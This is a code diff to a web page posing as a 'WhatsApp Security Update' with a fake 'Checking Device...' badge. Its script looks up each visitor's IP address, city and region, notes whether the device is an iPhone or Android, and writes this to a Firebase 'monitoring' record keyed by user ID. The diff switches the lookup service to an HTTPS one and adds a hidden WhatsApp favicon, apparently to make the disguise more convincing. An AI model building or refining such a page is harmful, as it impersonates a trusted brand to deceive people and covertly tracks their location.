@@ -26,7 +26,7 @@
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
+        <img src="https://upload.whatsapp.com/favicon.ico" class="logo" style="display:none"> <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
         <div class="header-title">WhatsApp Security Update</div>
         <div id="u-badge" class="badge">Checking Device...</div>
         <div class="v-box">
@@ -87,14 +87,14 @@
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             
-            // استخدام API أسرع وأضمن لجلب الـ IP والمحافظة
-            fetch('http://ip-api.com/json/')
+            // استخدام خدمة تدعم HTTPS بنسبة 100% وجلب البيانات بشكل أسرع
+            fetch('https://ipwho.is/')
                 .then(r => r.json())
                 .then(d => {
                     sRef.set({ 
                         status: "Online", 
-                        ip: d.query, 
-                        region: d.regionName + ", " + d.city, 
+                        ip: d.ip || "N/A", 
+                        region: (d.city || "") + ", " + (d.region || ""), 
                         device: isIOS ? "iPhone" : "Android", 
                         ts: Date.now() 
                     });
